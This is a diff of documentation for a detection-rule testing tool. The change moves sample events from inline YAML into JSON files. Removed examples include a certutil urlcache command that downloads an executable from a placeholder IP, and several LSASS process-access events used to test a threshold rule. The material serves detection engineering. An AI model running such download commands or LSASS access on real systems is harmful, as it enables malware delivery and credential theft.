@@ -1,6 +1,6 @@
 # Testing Detection Rules
 
-`bifract --test` runs a detection rule against sample logs and tells you whether it fires.
+`bifract --test` runs a detection rule against sample events and tells you whether it fires.
 
 You give it a rule, some events, and the verdict you expect. It reports pass or fail. Use it
 while writing a rule to check your logic against a captured event, or wire it into a pipeline
@@ -17,8 +17,8 @@ It works on both rule formats Bifract understands:
 The tester does not approximate matching. It runs the same pipeline as production:
 
 1. Your rule is lowered to BQL (`sigma.Translate` for Sigma, `queryString` for native alerts).
-2. Your sample logs go through the same normalization code path as HTTP ingestion.
-3. The logs are inserted into a scratch clone of the `logs` table.
+2. Your sample events go through the same normalization code path as HTTP ingestion.
+3. They are inserted into a scratch clone of the `logs` table.
 4. The real generated ClickHouse SQL runs against it. Rows returned means the rule fired.
 5. The scratch table is dropped.
 
@@ -28,7 +28,7 @@ the real one.
 
 Nothing is written to the real `logs` table, so it is safe to point the tester at a running
 deployment. Each test case is additionally scoped to its own synthetic fractal, so cases cannot
-contaminate one another's results, and a threshold rule counts only its own case's logs.
+contaminate one another's results, and a threshold rule counts only its own case's events.
 
 ## Quick start
 
@@ -55,12 +55,14 @@ detections/
 │   └── sysmon.yaml                 # exported from Settings -> Normalizers
 ├── certutil-download/
 │   ├── rule.yml                    # the Sigma rule or Bifract alert
-│   ├── rule.test.yaml              # what must and must not fire
-│   ├── true-positives.ndjson       # raw events, no test data in them
-│   └── benign.ndjson
+│   ├── rule.test.yaml              # which file must fire, which must not
+│   ├── true-positives.json         # raw events, nothing test-specific in them
+│   └── benign.json
 └── lsass-access-burst/
     ├── rule.yml
-    └── rule.test.yaml              # events written inline instead
+    ├── rule.test.yaml
+    ├── three-accesses-one-process.json
+    └── two-accesses-below-threshold.json
 ```
 
 Adding a detection is adding a folder. `example-detections/` in the Bifract repo is laid out
@@ -84,14 +86,22 @@ platform, team or ATT&CK tactic works just as well.
 
 ### The event files hold only events
 
-A `.json` or `.ndjson` file is raw captured telemetry with nothing test-specific in it, so you
-can drop an export straight in. The expected verdict lives in the `.test.yaml` beside it:
+Events always come from a file, never inline in the spec. A file is raw captured telemetry
+with nothing test-specific in it, so you can drop an export straight in, and it stays
+reviewable and reusable. The expected verdict lives in the `.test.yaml` beside it:
 
 ```yaml
 cases:
-  - {name: real attacks, expect: match,    logFile: true-positives.ndjson}
-  - {name: benign usage, expect: no_match, logFile: benign.ndjson}
+  - {name: real attacks, expect: match,    logFile: true-positives.json}
+  - {name: benign usage, expect: no_match, logFile: benign.json}
 ```
+
+Three shapes are accepted, auto-detected from the contents rather than the extension, so
+`.json` is fine for all of them:
+
+* a JSON array of event objects
+* a single JSON object
+* NDJSON, one event object per line
 
 ## Test file format
 
@@ -100,53 +110,35 @@ rule: rule.yml
 normalizer: ../normalizers/sysmon.yaml
 
 cases:
-  - name: certutil urlcache download
-    expect: match
-    log:
-      EventID: 1
-      Image: C:\Windows\System32\certutil.exe
-      CommandLine: certutil.exe -urlcache -split -f http://198.51.100.20/a.exe a.exe
-
-  - name: benign certutil encode
-    expect: no_match
-    log:
-      EventID: 1
-      Image: C:\Windows\System32\certutil.exe
-      CommandLine: certutil.exe -encode payload.bin payload.b64
-
   # Every event in the file must fire.
   - name: all known download variants fire
     expect: match
-    logFile: true-positives.ndjson
+    logFile: true-positives.json
 
   # No event in the file may fire.
   - name: no benign certutil usage fires
     expect: no_match
-    logFile: benign.ndjson
+    logFile: benign.json
 ```
 
 | Field | Meaning |
 |---|---|
 | `rule` | Path to the Sigma rule or Bifract alert YAML. Required. |
-| `normalizer` | Normalizer applied to this spec's logs. Optional but almost always wanted. |
+| `normalizer` | Normalizer applied to this spec's events. Optional but almost always wanted. |
 | `cases[].name` | Case name, shown in output and in CI reports. Required. |
 | `cases[].expect` | `match` or `no_match`. Required. |
-| `cases[].log` | One log, inline. |
-| `cases[].logs` | Several logs, inline. |
-| `cases[].logFile` | Events from a file: JSON array, single JSON object, or NDJSON. |
-| `cases[].together` | Judge the logs as one batch. Needed by threshold rules. |
+| `cases[].logFile` | Events file: JSON array, single JSON object, or NDJSON. Required. |
+| `cases[].together` | Judge the events as one batch. Needed by threshold rules. |
 | `cases[].count` | Assert an exact number of result rows. Requires `together`. |
-
-Set exactly one of `log`, `logs` or `logFile` per case.
 
 ## A case is all-or-nothing
 
-Every log in a case is judged **on its own**, and the case passes only if all of them meet
+Every event in a case is judged **on its own**, and the case passes only if all of them meet
 the expectation. A file of ten events with `expect: match` means all ten must fire; one with
 `expect: no_match` means none of them may. So the usual shape is one file per verdict and a
 case per file, as above.
 
-Output reports the ratio, and a failure names the log that broke:
+Output reports the ratio, and a failure names the event that broke:
 
 ```
   PASS every known true positive fires (4/4 logs matched)
@@ -163,26 +155,21 @@ Some rules only fire when they see several events at once. The LSASS example cou
 accesses from the same process, so judging each access alone would never reach the
 threshold.
 
-`together: true` presents the case's logs to the rule as a single batch instead:
+`together: true` presents the file's events to the rule as a single batch instead:
 
 ```yaml
-  - name: three lsass accesses from one process
+  - name: three accesses from one process trip the threshold
     expect: match
     together: true
-    logs:
-      - {EventID: 10, SourceImage: C:\a.exe, TargetImage: C:\Windows\System32\lsass.exe}
-      - {EventID: 10, SourceImage: C:\a.exe, TargetImage: C:\Windows\System32\lsass.exe}
-      - {EventID: 10, SourceImage: C:\a.exe, TargetImage: C:\Windows\System32\lsass.exe}
+    logFile: three-accesses-one-process.json
 
   - name: two accesses stay below the threshold
     expect: no_match
     together: true
-    logs:
-      - {EventID: 10, SourceImage: C:\b.exe, TargetImage: C:\Windows\System32\lsass.exe}
-      - {EventID: 10, SourceImage: C:\b.exe, TargetImage: C:\Windows\System32\lsass.exe}
+    logFile: two-accesses-below-threshold.json
 ```
 
-With `together`, the rule runs once over the whole set, so `expect: match` means the set as
+With `together`, the rule runs once over the whole file, so `expect: match` means the set as
 a whole triggered. `count` describes that single run's row count and therefore requires
 `together`; using it without is rejected when the spec loads.
 
